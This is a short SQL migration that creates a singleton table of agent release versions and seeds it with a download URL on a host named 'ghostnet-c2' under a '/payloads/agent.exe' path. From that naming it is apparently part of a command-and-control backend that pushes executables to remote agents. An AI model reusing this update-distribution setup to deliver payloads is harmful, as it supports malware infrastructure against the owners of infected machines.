-- agent_releases table (singleton row for auto-update)
CREATE TABLE IF NOT EXISTS agent_releases (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  version TEXT NOT NULL,
  update_url TEXT NOT NULL,
  update_sha256 TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

-- ensure only one active release (upsert by checking existing)
CREATE UNIQUE INDEX idx_agent_releases_version ON agent_releases(version);

-- seed with current release
INSERT INTO agent_releases (version, update_url, update_sha256)
VALUES (
  '1.0.0',
  'https://ghostnet-c2.netlify.app/payloads/agent.exe',
  'fb4c4d46a8eb2bd7ae332cf14a1e739e9b545ebf6b9757dbfc908617c7580f4c'
) ON CONFLICT (version) DO NOTHING;
